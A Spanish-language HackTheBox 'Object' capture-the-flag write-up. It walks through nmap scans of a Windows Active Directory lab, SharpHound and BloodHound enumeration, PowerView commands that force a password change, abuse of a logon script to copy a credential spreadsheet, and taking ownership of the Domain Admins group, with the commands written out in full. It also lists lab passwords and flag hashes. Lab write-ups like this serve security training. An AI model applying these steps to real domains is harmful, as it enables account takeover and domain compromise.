# HTB - Object 

**Dificultad:** Hard  
**OS:** Windows (Active Directory)  
**IP:** 10.129.96.147  
**Dominio:** object.local

---

## Reconocimiento

### Nmap - Puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.96.147 -oG allPorts
```

### Nmap - Versiones y scripts

```bash
nmap -sV -sC -p80,5985,8080 10.129.96.147 -oN target
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0  → "Mega Engines"
5985/tcp open  http    Microsoft HTTPAPI 2.0     → WinRM
8080/tcp open  http    Jetty 9.4.43.v20210629    → Jenkins
```

---




### Puerto 8080 - Jenkins

RCE en Jetty donde pudimos obtener la password de oliver

## Credenciales obtenidas

| Usuario | Password | Método |
|---|---|---|
| oliver | c1cdfun_d2434 | Jenkins |
| smith | Pixel123! | ForceChangePassword (oliver → smith) |
| maria | W3llcr4ft3d_4cls | Engines.xls |

---

## Active Directory - Enumeración con BloodHound

Se sube y ejecuta SharpHound desde la sesión de oliver:

```powershell
upload SharpHound.exe
.\SharpHound.exe --collectionmethods All
download 20260315163423_BloodHound.zip
```

El análisis de BloodHound revela la cadena de permisos:

```
oliver → ForceChangePassword → smith → scriptPath (logon script) → maria → WriteOwner/WriteDACL → Domain Admins
```

---

## Lateral Movement - oliver → smith

oliver tiene el permiso **ForceChangePassword** sobre smith. Con PowerView:

```powershell
upload PowerView.ps1
Import-Module .\PowerView.ps1

$NewPassword = ConvertTo-SecureString 'Pixel123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'smith' -AccountPassword $NewPassword
```

```bash
evil-winrm -i 10.129.96.147 -u smith -p Pixel123!
```

---

## Lateral Movement - smith → maria (Logon Script Abuse)

smith tiene el permiso de modificar el atributo **scriptPath** de maria. Este script se ejecuta automáticamente cuando maria inicia sesión.

### Paso 1 - Verificar ejecución de comandos

```powershell
Import-Module .\PowerView.ps1

echo 'whoami > C:\ProgramData\who' > C:\ProgramData\script.ps1
Set-DomainObject maria -Set @{'scriptPath'='C:\\ProgramData\\script.ps1'} -Verbose

# Esperar que maria haga login (tarea programada en el CTF)
type C:\ProgramData\who
# → object\maria
```

### Paso 2 - Exfiltrar archivo de credenciales

```powershell
echo 'copy C:\Users\maria\Desktop\Engines.xls C:\ProgramData\Engines.xls' > C:\ProgramData\script.ps1

# Descargar el archivo
download Engines.xls
```

El archivo `Engines.xls` contiene credenciales de maria: `W3llcr4ft3d_4cls`

```bash
evil-winrm -i 10.129.96.147 -u maria -p W3llcr4ft3d_4cls
```

---

## Escalada de privilegios - maria → Domain Admin

maria tiene el permiso **WriteOwner** sobre el grupo **Domain Admins**. Con PowerView:

```powershell
. .\PowerView.ps1

# 1. Tomar ownership del grupo Domain Admins
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'

# 2. Otorgarse todos los permisos sobre el grupo
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "maria"

# 3. Agregar maria al grupo Domain Admins
Add-ADGroupMember -Identity 'Domain Admins' -Members 'maria'
```

Reconectar la sesión para que los nuevos grupos apliquen:

```bash
evil-winrm -i 10.129.96.147 -u maria -p W3llcr4ft3d_4cls
```

### Root flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
74e98d49fae5d88b11f42cfe2cfbdcf0
```

---

## Flags

| Flag | Hash |
|---|---|
| user.txt | b57935374f2a5f2708407ed20ec3a4a7 |
| root.txt | 74e98d49fae5d88b11f42cfe2cfbdcf0 |

---

## Resumen de la cadena de ataque

```
1. Puerto 8080 Jenkins → RCE / credenciales oliver
2. BloodHound → mapeo de permisos AD
3. oliver →(ForceChangePassword)→ smith (cambio de password)
4. smith →(scriptPath)→ maria (logon script abuse → Engines.xls)
5. maria →(WriteOwner+WriteDACL)→ Domain Admins (ownership + ACL + member)
6. evil-winrm como maria (DA) → root.txt
```

---

## Herramientas utilizadas

- `nmap`
- `evil-winrm`
- `SharpHound` + `BloodHound`
- `PowerView.ps1`
- `Add-ADGroupMember`